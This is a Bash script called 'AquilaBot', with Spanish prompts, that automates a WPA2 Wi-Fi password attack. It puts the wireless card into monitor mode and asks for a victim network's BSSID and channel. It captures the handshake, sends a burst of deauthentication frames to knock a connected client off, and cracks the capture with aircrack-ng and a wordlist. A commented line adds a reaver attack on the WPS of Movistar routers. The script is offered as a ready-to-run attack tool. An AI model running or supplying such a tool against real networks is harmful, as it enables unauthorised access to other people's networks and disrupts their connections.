#!/bin/bash
aquilabot_start(){
  clear
  aq_banner=("         _                   _       _                   _          _             _                   _               _          _       " )
  aq_banner+=("        / /\                /\ \    /\_\                /\ \       _\ \          / /\                / /\            /\ \       /\ \     " )
  aq_banner+=("       / /  \              /  \ \  / / /         _      \ \ \     /\__ \        / /  \              / /  \          /  \ \      \_\ \    " )
  aq_banner+=("      / / /\ \            / /\ \ \ \ \ \__      /\_\    /\ \_\   / /_ \_\      / / /\ \            / / /\ \        / /\ \ \     /\__ \   " )
  aq_banner+=("     / / /\ \ \          / / /\ \ \ \ \___\    / / /   / /\/_/  / / /\/_/     / / /\ \ \          / / /\ \ \      / / /\ \ \   / /_ \ \  " )
  aq_banner+=("    / / /  \ \ \        / / /  \ \_\ \__  /   / / /   / / /    / / /         / / /  \ \ \        / / /\ \_\ \    / / /  \ \_\ / / /\ \ \ " )
  aq_banner+=("   / / /___/ /\ \      / / / _ / / / / / /   / / /   / / /    / / /         / / /___/ /\ \      / / /\ \ \___\  / / /   / / // / /  \/_/ " )
  aq_banner+=("  / / /_____/ /\ \    / / / /\ \/ / / / /   / / /   / / /    / / / ____    / / /_____/ /\ \    / / /  \ \ \__/ / / /   / / // / /        " )
  aq_banner+=(" / /_________/\ \ \  / / /__\ \ \/ / / /___/ / /___/ / /__  / /_/_/ ___/\ / /_________/\ \ \  / / /____\_\ \  / / /___/ / // / /         " )
  aq_banner+=("/ / /_       __\ \_\/ / /____\ \ \/ / /____\/ //\__\/_/___\/_______/\__\// / /_       __\ \_\/ / /__________\/ / /____\/ //_/ /          " )
  aq_banner+=("\_\___\     /____/_/\/________\_\/\/_________/ \/_________/\_______\/    \_\___\     /____/_/\/_____________/\/_________/ \_\/           " )
  aq_banner+=("                                                                                                                                         " )
  for line in "${aq_banner[@]}"; do
    echo "$line"; sleep 0.1
  done

  echo -e "\\n\\n" #haciendo espacio

}

aquilabot_set_resolution() { # Pos. Ventanas + Resolucion

  # Obtener dimensiones
  SCREEN_SIZE=$(xdpyinfo | grep dimension | awk '{print $4}' | tr -d "(")
  SCREEN_SIZE_X=$(printf '%.*f\n' 0 $(echo $SCREEN_SIZE | sed -e s'/x/ /'g | awk '{print $1}'))
  SCREEN_SIZE_Y=$(printf '%.*f\n' 0 $(echo $SCREEN_SIZE | sed -e s'/x/ /'g | awk '{print $2}'))

  # Calcular ventanas proporcionales
  if hash bc ;then
    PROPOTION=$(echo $(awk "BEGIN {print $SCREEN_SIZE_X/$SCREEN_SIZE_Y}")/1 | bc)
    NEW_SCREEN_SIZE_X=$(echo $(awk "BEGIN {print $SCREEN_SIZE_X/3}")/1 | bc)
    NEW_SCREEN_SIZE_Y=$(echo $(awk "BEGIN {print $SCREEN_SIZE_Y/3}")/1 | bc)

    NEW_SCREEN_SIZE_BIG_X=$(echo $(awk "BEGIN {print 1.5*$SCREEN_SIZE_X/3}")/1 | bc)
    NEW_SCREEN_SIZE_BIG_Y=$(echo $(awk "BEGIN {print 1.5*$SCREEN_SIZE_Y/3}")/1 | bc)

    SCREEN_SIZE_MID_X=$(echo $(($SCREEN_SIZE_X + ($SCREEN_SIZE_X - 2 * $NEW_SCREEN_SIZE_X) / 2)))
    SCREEN_SIZE_MID_Y=$(echo $(($SCREEN_SIZE_Y + ($SCREEN_SIZE_Y - 2 * $NEW_SCREEN_SIZE_Y) / 2)))

    # Upper windows
    TOPLEFT="-geometry $NEW_SCREEN_SIZE_Xx$NEW_SCREEN_SIZE_Y+0+0"
    TOPRIGHT="-geometry $NEW_SCREEN_SIZE_Xx$NEW_SCREEN_SIZE_Y-0+0"
    TOP="-geometry $NEW_SCREEN_SIZE_Xx$NEW_SCREEN_SIZE_Y+$SCREEN_SIZE_MID_X+0"

    # Lower windows
    BOTTOMLEFT="-geometry $NEW_SCREEN_SIZE_Xx$NEW_SCREEN_SIZE_Y+0-0"
    BOTTOMRIGHT="-geometry $NEW_SCREEN_SIZE_Xx$NEW_SCREEN_SIZE_Y-0-0"
    BOTTOM="-geometry $NEW_SCREEN_SIZE_Xx$NEW_SCREEN_SIZE_Y+$SCREEN_SIZE_MID_X-0"

    # Y mid
    LEFT="-geometry $NEW_SCREEN_SIZE_Xx$NEW_SCREEN_SIZE_Y+0-$SCREEN_SIZE_MID_Y"
    RIGHT="-geometry $NEW_SCREEN_SIZE_Xx$NEW_SCREEN_SIZE_Y-0+$SCREEN_SIZE_MID_Y"

    # Big
    TOPLEFTBIG="-geometry $NEW_SCREEN_SIZE_BIG_Xx$NEW_SCREEN_SIZE_BIG_Y+0+0"
    TOPRIGHTBIG="-geometry $NEW_SCREEN_SIZE_BIG_Xx$NEW_SCREEN_SIZE_BIG_Y-0+0"
  fi
}

aquilabot_attack_wpa2_dic(){
  airmon-ng check
  airmon-ng check kill
  airmon-ng start wlan0
  xterm $BOTTOMRIGHT -hold -e "timeout 180 airodump-ng wlan0mon"&
  echo Ingresa BSSID del objetivo
  read -r bidvictima
  echo Ingresa el Canal de la victima
  read -r chnlvictima
  xterm $TOPRIGHT -hold -e "airodump-ng wlan0mon -w cap -c $chnlvictima --bssid $bidvictima"& sleep 10 &&
  echo "Ingresa BSSID del cliente en el objetivo (STATION)"
  read -r client_aq ; xterm $TOPLEFT -hold -e "aireplay-ng --deauth 322 -a $bidvictima -c $client_aq wlan0mon"& sleep 10 &&
  echo "----------------------------------------------------------------------------------------------------------------";
  echo "1. Usar Default Wordlist.";
  echo "2. Usar Complete WordList.";
  read -r option_aq
  if [ $option_aq == "1" ]; then
     wordlist="/usr/share/wordlists/DEAD-human.txt"
  else
     wordlist="/usr/share/wordlists/DEAD.txt"
  fi
  aircrack-ng -w $wordlist -b "$bidvictima" ./*.cap
  echo Deshabilitando modo monitor
  airmon-ng stop wlan0mon
  echo Borrando Handshake ...
  rm cap*
}

aquilabot_menu(){
  echo "Selecciona..."
  echo ""
  echo "1) WPA 2 ATAQUE DICCIONARIO"
  echo "0) Salir"
  echo ""
  while :
  do
    read -r THE_WUT
    case $THE_WUT in
    1)
      echo Hey Listen!
      aquilabot_attack_wpa2_dic
      ;;
    0)
      echo See you again!
      break
      ;;
    *)
      echo "Sorry, No te entiendo bruh"
      ;;
    esac
  done
  echo
  echo "That's all folks!"
}

aquilabot_main(){
  aquilabot_start
  aquilabot_set_resolution
  aquilabot_menu

  echo enjoy! GL HF!
}

aquilabot_main

#reaver -i mon0 -b XX:XX:XX:XX:XX:XX -n -d 2 -T 2 - t 2 -vv       //WPS - MOVISTAR
#probar dumpper jumpster